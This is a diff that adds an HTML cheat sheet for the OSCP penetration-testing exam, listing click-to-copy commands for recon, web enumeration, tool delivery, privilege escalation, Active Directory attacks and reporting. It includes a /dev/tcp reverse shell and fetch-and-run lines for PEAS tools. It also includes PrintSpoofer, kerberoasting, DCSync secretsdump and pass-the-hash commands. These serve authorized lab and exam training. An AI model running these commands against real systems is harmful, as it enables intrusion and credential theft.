@@ -1,0 +1,216 @@
+<!doctype html><html lang=en><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>OSCP Exam Cheatsheet</title>
+<style>
+  :root{
+    color-scheme:light;
+    --bg:#f4f6f8; --surface:#fff; --surface-2:#eef1f4; --fg:#16202a; --muted:#5a6b7a; --faint:#8595a3;
+    --border:#d8dee4; --accent:#1f6feb; --accent-soft:#e6f0ff;
+    --term-bg:#0d1b24; --term-fg:#d6e6ef; --term-prompt:#4fd6a0; --term-cmt:#5f7d8c;
+    --warn:#d1242f; --warn-soft:#fbe9ea;
+    --shadow:0 1px 3px rgba(20,32,42,.08),0 6px 20px rgba(20,32,42,.05);
+    --mono:"JetBrains Mono",ui-monospace,"SFMono-Regular",Menlo,Consolas,monospace;
+    --sans:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  }
+  @media (prefers-color-scheme:dark){:root:not([data-theme=light]){
+    --bg:#0b1016; --surface:#141b23; --surface-2:#1c252f; --fg:#e4ecf2; --muted:#9fb0bd; --faint:#6e8192;
+    --border:#28333e; --accent:#58a6ff; --accent-soft:#15293f;
+    --term-bg:#07121a; --term-fg:#c6dae6; --term-prompt:#4fd6a0; --term-cmt:#5a7382;
+    --warn:#ff6b74; --warn-soft:#2a1618;
+    --shadow:0 1px 3px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.3);
+    color-scheme:dark;
+  }}
+  :root[data-theme=dark]{
+    --bg:#0b1016; --surface:#141b23; --surface-2:#1c252f; --fg:#e4ecf2; --muted:#9fb0bd; --faint:#6e8192;
+    --border:#28333e; --accent:#58a6ff; --accent-soft:#15293f;
+    --term-bg:#07121a; --term-fg:#c6dae6; --term-prompt:#4fd6a0; --term-cmt:#5a7382;
+    --warn:#ff6b74; --warn-soft:#2a1618;
+    --shadow:0 1px 3px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.3);
+    color-scheme:dark;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 var(--sans);
+    padding:env(safe-area-inset-top,0) 16px env(safe-area-inset-bottom,0)}
+  .wrap{max-width:980px;margin:0 auto;padding:24px 0 64px}
+  header{display:flex;flex-wrap:wrap;align-items:baseline;gap:8px 14px;margin-bottom:4px}
+  h1{font-size:22px;margin:0;letter-spacing:-.02em}
+  .sub{color:var(--muted);font-size:13px}
+  .hint{color:var(--faint);font-size:12px;margin:10px 0 22px}
+  .hint b{color:var(--muted)}
+  .theme-btn{margin-left:auto;background:var(--surface);border:1px solid var(--border);color:var(--muted);
+    border-radius:8px;padding:5px 11px;font:inherit;font-size:12px;cursor:pointer}
+  section{background:var(--surface);border:1px solid var(--border);border-radius:12px;
+    box-shadow:var(--shadow);margin:14px 0;overflow:hidden}
+  .head{display:flex;align-items:center;gap:10px;padding:11px 16px;background:var(--surface-2);
+    border-bottom:1px solid var(--border)}
+  .num{font:600 12px var(--mono);color:#fff;background:var(--accent);border-radius:6px;
+    padding:2px 8px;flex:none}
+  .head h2{font-size:15px;margin:0;font-weight:600}
+  .head .tag{margin-left:auto;font-size:11px;color:var(--faint);text-transform:uppercase;letter-spacing:.05em}
+  .body{padding:12px 16px}
+  .note{color:var(--muted);font-size:12.5px;margin:0 0 10px}
+  .note code{font-family:var(--mono);font-size:12px;background:var(--surface-2);
+    padding:1px 5px;border-radius:4px}
+  pre{margin:0 0 10px;background:var(--term-bg);border-radius:8px;padding:11px 13px;overflow-x:auto}
+  pre:last-child{margin-bottom:0}
+  .cmd{display:block;font:13px/1.65 var(--mono);color:var(--term-fg);white-space:pre;
+    cursor:pointer;border-radius:4px;padding:0 4px;margin:0 -4px;position:relative;transition:background .12s}
+  .cmd:hover{background:rgba(127,160,180,.14)}
+  .cmd::before{content:"$";color:var(--term-prompt);margin-right:9px;user-select:none}
+  .cmd.nop::before{content:"";margin:0}
+  .cmd .c{color:var(--term-cmt)}
+  .cmd.copied::after{content:"copied";position:absolute;right:4px;color:var(--term-prompt);
+    font-size:11px;background:var(--term-bg);padding-left:8px}
+  .warn{background:var(--warn-soft);border:1px solid var(--warn);border-radius:10px;padding:12px 16px;margin:14px 0}
+  .warn h2{margin:0 0 6px;font-size:14px;color:var(--warn)}
+  .warn ul{margin:0;padding-left:18px}
+  .warn li{margin:3px 0;font-size:13px}
+  .warn b{color:var(--warn)}
+  ol.reset{margin:0;padding-left:20px}
+  ol.reset li{margin:4px 0;font-size:13px}
+  ol.reset code{font-family:var(--mono);font-size:12px;background:var(--surface-2);padding:1px 5px;border-radius:4px}
+  @media print{body{background:#fff}.theme-btn{display:none}section{break-inside:avoid;box-shadow:none}
+    pre{background:#f2f2f2}.cmd,.cmd .c{color:#000}.cmd::before{color:#333}}
+</style></head>
+<body><div class=wrap>
+<header>
+  <h1>OSCP Exam — Command List</h1>
+  <span class=sub>phase → harness script → raw command</span>
+  <button class=theme-btn id=theme>◐ theme</button>
+</header>
+<p class=hint>Scripts live in <b>exam-harness/scripts/</b>. <b>Click any line to copy it.</b>
+Set <b>&lt;KALI&gt;</b> = your tun0 IP. Full detail: <b>exam-harness/USAGE.md</b> · deep ref: <b>docs/10_Commands_Quick_Reference.md</b></p>
+
+<section><div class=head><span class=num>0</span><h2>Session setup</h2><span class=tag>once per exam</span></div>
+<div class=body>
+<pre>
+<span class=cmd>KALI=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1); echo $KALI</span>
+<span class=cmd>sudo apt install -y rlwrap</span>
+<span class=cmd>sudo openvpn Offsec/universal.ovpn &<span class=c>   # then: ip a</span></span>
+<span class=cmd>export WORKDIR=~/Desktop/HTB<span class=c>            # PRACTICE only; unset for exam</span></span>
+<span class=cmd>./scripts/oscp-layout.sh<span class=c>               # tmux: serve | listener | work</span></span>
+<span class=cmd>./scripts/logsession.sh box1<span class=c>           # log every keystroke (evidence)</span></span>
+</pre>
+</div></section>
+
+<section><div class=head><span class=num>1</span><h2>Per box — recon</h2><span class=tag>automate</span></div>
+<div class=body>
+<pre>
+<span class=cmd>./scripts/newtarget.sh box1 10.10.10.10<span class=c>    # targets/box1/ + notes.md</span></span>
+<span class=cmd>./scripts/rx.sh box1 10.10.10.10<span class=c>           # reconx = PRIMARY ranked enum</span></span>
+<span class="cmd nop c">  read: targets/box1/scans/reconx/10.10.10.10/NOTES.md  then notes.md</span>
+<span class=cmd>./scripts/recon.sh 10.10.10.10 box1<span class=c>        # fallback (no deps)</span></span>
+</pre>
+<p class=note>Manual port peek: <code>nmap -p- --min-rate 2000 IP</code> then <code>nmap -sCV -p&lt;ports&gt; IP</code></p>
+</div></section>
+
+<section><div class=head><span class=num>2</span><h2>Web quick hits</h2><span class=tag>manual</span></div>
+<div class=body>
+<pre>
+<span class=cmd>whatweb http://IP ; curl -sI http://IP</span>
+<span class=cmd>feroxbuster -u http://IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html</span>
+<span class=cmd>gobuster vhost -u http://IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span>
+</pre>
+</div></section>
+
+<section><div class=head><span class=num>3</span><h2>Shell + deliver tools</h2><span class=tag>serve :7890</span></div>
+<div class=body>
+<p class=note>Kali serves <code>serve/</code>. Grab tools <b>on the target</b>:</p>
+<pre>
+<span class=cmd>wget http://$KALI:7890/linux/linpeas.sh -O /tmp/lp.sh; bash /tmp/lp.sh</span>
+<span class=cmd>iwr http://$KALI:7890/windows/winPEASx64.exe -o wp.exe; .\wp.exe<span class=c>  # Windows</span></span>
+<span class=cmd>./scripts/listener.sh 443<span class=c>                 # catch (re-run per shell)</span></span>
+</pre>
+<p class=note>Stabilise Linux shell: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> → Ctrl-Z → <code>stty raw -echo; fg</code> → <code>export TERM=xterm</code></p>
+<pre>
+<span class=cmd>bash -i >& /dev/tcp/$KALI/443 0>&1<span class=c>         # revshell (or revshells.com)</span></span>
+</pre>
+</div></section>
+
+<section><div class=head><span class=num>4</span><h2>Privilege escalation</h2><span class=tag>manual — think it through</span></div>
+<div class=body>
+<pre>
+<span class="cmd nop c"># Linux</span>
+<span class=cmd>sudo -l<span class=c>                                   # GTFOBins any allowed binary</span></span>
+<span class=cmd>find / -perm -4000 -type f 2>/dev/null<span class=c>    # SUID</span></span>
+<span class=cmd>getcap -r / 2>/dev/null ; cat /etc/crontab</span>
+<span class="cmd nop c"># Windows</span>
+<span class=cmd>whoami /priv<span class=c>   # SeImpersonate -> PrintSpoofer64 / GodPotato-NET4 (serve/windows)</span></span>
+<span class=cmd>.\PrintSpoofer64.exe -i -c cmd</span>
+</pre>
+</div></section>
+
+<section><div class=head><span class=num>5</span><h2>Active Directory</h2><span class=tag>in order</span></div>
+<div class=body>
+<pre>
+<span class=cmd>./scripts/gen-hosts.sh -r 192.168.120.0/24 -x $KALI<span class=c>       # live hosts</span></span>
+<span class=cmd>./scripts/ad-fastpath.sh -d corp.local -i &lt;DC&gt;<span class=c>            # unauth + AS-REP</span></span>
+<span class=cmd>./scripts/ad-fastpath.sh -d corp.local -i &lt;DC&gt; -u u -p p -c -b<span class=c>  # kerberoast+crack+BH</span></span>
+<span class=cmd>./scripts/ad-secretsdump.sh -t &lt;host&gt; -d corp.local -u adm -p p -S loot/hosts.txt</span>
+<span class=cmd>./scripts/ad-secretsdump.sh -t &lt;DC&gt; -d corp.local -u da -H &lt;nthash&gt;<span class=c>  # DCSync</span></span>
+<span class=cmd>./scripts/bloodhound.sh start<span class=c>   # UI :8080 ; drag .zip ; shortest path to DA</span></span>
+</pre>
+<p class=note>Move: <code>evil-winrm -i IP -u u -p p</code> | <code>-H &lt;hash&gt;</code> (PtH) | <code>impacket-psexec corp/u:p@IP</code></p>
+</div></section>
+
+<section><div class=head><span class=num>6</span><h2>Capture proof</h2><span class=tag>the moment you flag</span></div>
+<div class=body>
+<pre>
+<span class=cmd>./scripts/proof.sh -n box1 -i 10.10.10.10 -t local -f &lt;flag&gt;<span class=c>   # user</span></span>
+<span class=cmd>./scripts/proof.sh -n box1 -i 10.10.10.10 -t proof -f &lt;flag&gt;<span class=c>   # root</span></span>
+<span class=cmd>./scripts/proof.sh -l<span class=c>                                        # points tally</span></span>
+</pre>
+<p class=note>Screenshot with IP in frame: Win <code>type proof.txt & ipconfig</code> · Lin <code>cat proof.txt; ip a</code></p>
+</div></section>
+
+<section><div class=head><span class=num>7</span><h2>Report</h2></div>
+<div class=body>
+<pre>
+<span class=cmd>cp report/OSCP-Report-Template.md report/MyExamReport.md</span>
+<span class=cmd>./scripts/md2report.sh report/MyExamReport.md -d<span class=c>          # -> PDF (+DOCX)</span></span>
+</pre>
+</div></section>
+
+<div class=warn>
+<h2>⚠ Exam rules — don't lose points</h2>
+<ul>
+<li><b>Metasploit / meterpreter: ONE box only.</b> No auto-exploit (sqlmap auto, autorecon-exploit, nuclei).</li>
+<li>Screenshot <b>every</b> local.txt / proof.txt with your IP in the same frame.</li>
+<li>Verify kit intact: <code>cd serve && sha256sum -c MANIFEST.sha256</code></li>
+</ul>
+</div>
+
+<section><div class=head><span class=num>⟳</span><h2>When stuck — 3-min reset</h2></div>
+<div class=body>
+<ol class=reset>
+<li>Re-read <code>NOTES.md</code> top findings — did you enum <em>every</em> port/service?</li>
+<li>UDP? <code>nmap -sU --top-ports 50 IP</code></li>
+<li>Creds reuse across boxes / services?</li>
+<li>Web: every vhost, every dir, page source/comments, default creds?</li>
+<li>Privesc: re-run PEAS as the <em>new</em> user; re-check <code>sudo -l</code>.</li>
+</ol>
+</div></section>
+
+</div>
+<script>
+  // click-to-copy
+  document.querySelectorAll('.cmd:not(.nop)').forEach(el=>{
+    el.addEventListener('click',()=>{
+      const t=el.textContent.replace(/\s*#.*$/,'').trim();
+      navigator.clipboard.writeText(t).then(()=>{
+        el.classList.add('copied');
+        setTimeout(()=>el.classList.remove('copied'),1100);
+      });
+    });
+  });
+  // theme toggle (persists)
+  const root=document.documentElement, btn=document.getElementById('theme');
+  try{const s=localStorage.getItem('cs-theme'); if(s)root.setAttribute('data-theme',s);}catch(e){}
+  btn.addEventListener('click',()=>{
+    const cur=root.getAttribute('data-theme')||
+      (matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');
+    const next=cur==='dark'?'light':'dark';
+    root.setAttribute('data-theme',next);
+    try{localStorage.setItem('cs-theme',next);}catch(e){}
+  });
+</script>
+</body></html>
